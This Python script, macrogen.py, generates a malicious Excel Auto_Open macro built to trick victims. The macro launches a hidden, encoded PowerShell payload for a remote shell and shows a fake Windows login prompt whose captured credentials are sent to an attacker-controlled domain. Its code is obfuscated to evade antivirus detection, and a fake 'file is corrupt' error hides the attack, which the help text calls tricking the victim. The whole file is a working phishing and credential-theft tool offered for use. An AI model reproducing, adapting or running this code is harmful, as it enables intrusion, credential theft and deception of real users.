#!/usr/bin/python

import base64
import re
import sys
import os

def gen_usage():
    print "\n\tUsage: python macrogen.py <path to base64 encoded powershell payload> <attacker controlled domain name or external IP>"
    print "\n\tExample: python macrogen.py /tmp/b64_encoded_psh.txt example.com"
    print "\n\tHelp Menu: python macrogen.py --help"

def macro_help():
    print """
[*******************************************************************************************************]

				-----MACRO ATTACK INSTRUCTIONS----

For the macro attack, you will need to go to File, Properties, Ribbons, and select Developer. Once you do
that, you will have a developer tab. Create a new macro, call it Auto_Open and paste the generated code
into that. This will automatically run. Note that a message will prompt to the user saying that the file
is corrupt and automatically close the excel document. THIS IS NORMAL BEHAVIOR! This is tricking the
victim into thinking that the excel document is corrupted. You should get a shell through powershell injection
after that.

NOTE: WHEN COPYING AND PASTING THE EXCEL, IF THERE ARE ADDITIONAL SPACES THAT ARE ADDED YOU NEED TO
REMOVE THESE AFTER EACH OF THE POWERSHELL CODE SECTIONS UNDER VARIABLE "x" OR A SYNTAX ERROR WILL
HAPPEN!

[*******************************************************************************************************]

	"""


# split string
def split_str(s, length):
    return [s[i:i+length] for i in range(0, len(s), length)]

def b64psh(b64pshpath):
    if os.path.isfile(b64pshpath):
        with open(b64pshpath, 'r') as b64pshfile:
            data = b64pshfile.read().replace('\n','')
            return data
    else:
        print "[!] {0} does not exist. Please check your path".format(b64pshpath)
        sys.exit(1)

# Credential Harvest
def invoke_pass_psh(domain):
    invoke_pass_script = """function Invoke-LoginPrompt\n{\n[System.Reflection.Assembly]::LoadWithPartialName("System.web")\n$cred = $Host.ui.PromptForCredential("Windows Security", "Please enter user credentials", "$env:userdomain\$env:username","")\n$username = "$env:username"\n$domain = "$env:userdomain"\n$full = "$domain" + "\" + "$username"\n$password = $cred.GetNetworkCredential().password\n$output = $newcred = $cred.GetNetworkCredential() | select-object UserName, Domain, Password\n$username = $output.UserName\nSend-Credentials($username, $password, $domain)\n}\n\nfunction Send-Credentials($username, $password, $domain)\n{\n$wc = New-Object system.Net.WebClient;\n$username = [System.Web.HttpUtility]::UrlEncode($username);\n$full = [System.Web.HttpUtility]::UrlEncode($full);\n$res = $wc.downloadString("http://"""
    invoke_pass_script += domain
    invoke_pass_script += """/pass.php?harvest=$username&misc=$full")\n}\n\nInvoke-LoginPrompt\nSend-Credentials"""
    data = base64.b64encode(invoke_pass_script.encode('utf_16_le'))
    return data

# generate full macro
def generate_macro(b64psh):
    #start of the macro
    macro_str_psh = ""
    
    '''
    Jaime's original code below.  Been getting caught by AV so it's been replaced with the obfuscated code that follows.
    #macro_str_psh_head = """Sub Auto_Open()\nDim x\nx = "pOWerS" _\n& "heLl.e" _\n& "xe "
    #"""
    #macro_str_psh_tail = """\nDim y\ny =  "-nop -win hidden -noni -enc """
    '''
    macro_str_psh_head = """Sub Auto_Open()\n\nDim ggjeongnjut\nggjeongnjut = "pOwEr5kjnLKJlkJkygUKYlhJBG"\n\nDim ddooffrij\nddooffrij = Left(ggjeongnjut, 6)\n\nDim ggjoytior\nggjoytior = Replace(ddooffrij, "5", "S")\n\nDim rigjs\nrigjs = "gGnRRoeOhElL.E"\n\nDim x\nx = ggjoytior _\n& Right(rigjs, 6) _\n& "xe "\n\nDim pon\npon = "-no" _\n& "p "\n\nDim niw\nniw = "-w!n "\nDim luuzlwin\nluuzlwin = Replace(niw, "!", "i")\n\nDim herdnecd\nherdnecd = "hidden -noni -enc " \n\nDim xiferp\nxiferp = pon _\n& luuzlwin _\n& herdnecd
    """
    macro_str_psh_tail = """\nDim y\ny = xiferp _\n& """ 
    line_length = 380
    b64psh_command_list = split_str(b64psh(b64pshpath), line_length)
    for line in b64psh_command_list:
        macro_str_psh += "& \"" + line + "\" _\n"
    macro_str_psh = macro_str_psh.replace("& ", "", 1)
    macro_str_psh = macro_str_psh[:-3]
    macro_str_psh = macro_str_psh_head + macro_str_psh_tail + macro_str_psh
    macro_str_psh_tail = macro_str_psh_tail.replace("& ", "", 1)
    macro_str_psh = macro_str_psh.replace("-enc \"", "-enc ", 1)
    macro_str_invoke_pass = """\nDim z\nz = xiferp _\n& """
    invoke_pass_command_list = split_str(invoke_pass_psh(domain), line_length)
    for line in invoke_pass_command_list:
        macro_str_invoke_pass += "& \"" + line + "\" _\n"
    macro_str_invoke_pass = macro_str_invoke_pass[:-3]
    macro_str_invoke_pass = macro_str_invoke_pass.replace("& ", "", 1)
    macro_str_invoke_pass = macro_str_invoke_pass.replace("-enc \"", "-enc ", 1)
    macro_str_combined = macro_str_psh + macro_str_invoke_pass
    macro_str_combined += """\nShell (x & x & y)\nShell (x & x & z)\nDim title As String\ntitle = "Critical error"\nDim msg As String\nDim intResponse As Integer\nmsg = "An error has occured while decrypting the file. Excel is unable to continue."\nintResponse = MsgBox(msg, 16, title)\nApplication.Quit\nEnd Sub"""
    return macro_str_combined

def write_file(path, text):
    file_write = file(path, "w")
    file_write.write(text)
    file_write.close()

try:
    b64pshpath = ""

    if len(sys.argv) > 1:
        if sys.argv[1] == "--help":
            macro_help()
            gen_usage()
            sys.exit()
        else:
            b64pshpath = sys.argv[1]
            domain = sys.argv[2]
            macro_attack = generate_macro(b64psh)
            write_file("powershell_macro.txt", macro_attack)
            macro_help()
            print "[*] Exported powershell output code to powershell_macro.txt"

    elif len(sys.argv) < 1:
        gen_usage()

except Exception, e:
    print "[!] Something went wrong, printing the error: " + str(e)
    gen_usage()
